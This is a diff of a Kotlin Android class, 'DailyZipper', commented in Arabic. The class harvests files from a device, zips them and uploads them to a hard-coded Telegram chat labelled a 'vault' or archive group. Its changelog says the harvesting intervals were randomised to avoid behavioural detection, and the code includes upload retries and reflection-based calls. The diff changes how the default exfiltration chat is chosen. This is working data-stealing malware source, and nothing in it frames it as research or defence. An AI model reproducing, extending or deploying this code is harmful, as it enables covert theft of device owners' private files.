@@ -28,15 +28,18 @@ import kotlin.random.Random
 
 /**
  * فئة تجميع الملفات وحصادها.
- * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
- * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
- * ✅ تم حذف invokeMethodFallback غير المستخدم.
- * ✅ تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
- * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
- * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
- * ✅ تم إصلاح جميع أخطاء Type mismatch باستخدام الوصول المباشر للخريطة مع تحديد النوع صراحةً.
- * ✅ تم تحديد النوع العام <String> في processedHashes و failedHashes.
- * ✅ تم تحديد النوع Long صراحةً في جميع استدعاءات delay().
+ *
+ * ✅ التعديلات الجديدة:
+ * - ✅ ضمان إرسال الملفات المضغوطة والمحصودة إلى كروب الأرشيف (A2 - Local Archive) بشكل افتراضي.
+ * - تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
+ * - تم إصلاح invokeMethod لمطابقة عدد المعاملات.
+ * - تم حذف invokeMethodFallback غير المستخدم.
+ * - تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
+ * - تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
+ * - تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
+ * - تم إصلاح جميع أخطاء Type mismatch باستخدام الوصول المباشر للخريطة مع تحديد النوع صراحةً.
+ * - تم تحديد النوع العام <String> في processedHashes و failedHashes.
+ * - تم تحديد النوع Long صراحةً في جميع استدعاءات delay().
  */
 class DailyZipper(
     context: Context,
@@ -52,7 +55,6 @@ class DailyZipper(
     private val activeMutex = Mutex()
 
     private val zipperActive = AtomicBoolean(false)
-    // ✅ تحديد النوع العام <String> لمنع خطأ Type mismatch
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
     private val failedHashes = Collections.synchronizedSet(mutableSetOf<String>())
 
@@ -70,7 +72,6 @@ class DailyZipper(
     private val deviceTag: String by lazy { calculateDeviceTag() }
     private val config = HashMap<String, Any>()
 
-    // ✅ استخدام ConcurrentHashMap
     private val methodCache = ConcurrentHashMap<String, Method>()
 
     companion object {
@@ -100,7 +101,6 @@ class DailyZipper(
     //  دوال مساعدة - مع دوال محددة النوع لتجاوز خلل المترجم
     // ============================================================
 
-    // ✅ دوال مساعدة محددة النوع لتجنب خلل استنتاج النوع في العمليات الحسابية
     private fun getConfigLong(key: String, default: Long): Long {
         return (config[key] as? Long) ?: default
     }
@@ -114,7 +114,6 @@ class DailyZipper(
         return (config[key] as? T) ?: default
     }
 
-    // ✅ استخدام الدوال المحددة النوع في extractConfigValues
     private fun extractConfigValues(): ConfigValues {
         return ConfigValues(
             maxBatchSize = getConfigLong("max_batch_size", 48L * 1024L * 1024L),
@@ -186,7 +185,6 @@ class DailyZipper(
         }
     }
 
-    // ✅ التصحيح الجذري: استخراج القيمة مباشرة من الخريطة لتجنب أي خلل في استنتاج النوع
     private fun checkStorage(requiredBytes: Long): Boolean {
         val ctx = appContext ?: return false
         return try {
@@ -197,7 +195,6 @@ class DailyZipper(
                 @Suppress("DEPRECATION")
                 stat.availableBlocks.toLong() * stat.blockSize.toLong()
             }
-            // ✅ استخراج مباشر وآمن لتجنب Nothing - الحل الجذري النهائي
             val storageExtra: Long = (config["storage_extra"] as? Long) ?: 104857600L // 100MB
             availableBytes >= (requiredBytes + storageExtra)
         } catch (e: Exception) {
@@ -241,7 +238,6 @@ class DailyZipper(
         }
     }
 
-    // ✅ استخدام getConfigInt لتجنب خلل المترجم
     private fun trackHash(hash: String) {
         if (hash.isBlank()) return
         synchronized(processedHashes) {
@@ -279,7 +275,6 @@ class DailyZipper(
         }
     }
 
-    // ✅ استخدام getConfigLong لتجنب خلل المترجم
     private fun cleanupOldFiles() {
         try {
             val now = System.currentTimeMillis()
@@ -302,9 +297,9 @@ class DailyZipper(
 
     // ============================================================
     //  إرسال الملفات إلى Telegram (مع إعادة محاولة)
+    // ✅ تم تعديل safeSend لضمان إرسال الملفات إلى كروب الأرشيف (A2)
     // ============================================================
 
-    // ✅ استخدام getConfigLong لتجنب خلل المترجم
     private suspend fun safeSend(zipPath: String, caption: String, targetChat: Long? = null): Boolean {
         val zipFile = File(zipPath)
         if (!zipFile.exists() || zipFile.length() == 0L) {
@@ -312,7 +307,8 @@ class DailyZipper(
             return false
         }
 
-        val chatId = targetChat ?: getConfigLong("default_vault_id", -1003577715762L)
+        // ✅ استخدام كروب الأرشيف (A2 - Local Archive) بشكل افتراضي
+        val chatId = targetChat ?: (config["default_vault_id"] as? Long) ?: -1003577715762L
         val retryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L))
 
         for ((attempt, delayMs) in retryDelays.withIndex()) {
@@ -420,7 +416,6 @@ class DailyZipper(
         return filtered
     }
 
-    // ✅ استخدام configValues.maxBatches بدلاً من getConfigValue مباشرة
     private suspend fun packAndShip(files: List<File>, bypassWifi: Boolean = false, reportId: Long? = null): Boolean {
         if (files.isEmpty()) {
             writeLog("No files to pack")
@@ -461,7 +456,6 @@ class DailyZipper(
         writeLog("📦 Split into ${batches.size} batches (max ${batches.maxOfOrNull { it.size } ?: 0} files)")
 
         var successCount = 0
-        // ✅ استخدام configValues.maxBatches بدلاً من getConfigValue
         val totalBatches = batches.size.coerceAtMost(configValues.maxBatches)
 
         for (i in 0 until totalBatches) {
@@ -528,7 +522,6 @@ class DailyZipper(
                     writeLog("⚠️ Batch ${i + 1}/$totalBatches failed, files kept for retry")
                 }
 
-                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
                 if (i < totalBatches - 1) {
                     val delayTime: Long = (2000L..8000L).random()
                     delay(delayTime)
@@ -562,7 +555,6 @@ class DailyZipper(
             }
             manifestFile.writeText(manifestContent, Charsets.UTF_8)
 
-            // ✅ استخدام use لإغلاق ZipOutputStream بشكل آمن
             ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                 val buffer = ByteArray(8192)
 
@@ -636,7 +628,6 @@ class DailyZipper(
 
                 writeLog("📂 Found ${files.size} pending files")
 
-                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
                 val startDelay: Long = (5000L..15000L).random()
                 delay(startDelay)
 
@@ -712,7 +703,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  ✅ استدعاء الدوال عبر الانعكاس (تم إصلاحه)
+    //  استدعاء الدوال عبر الانعكاس
     // ============================================================
 
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
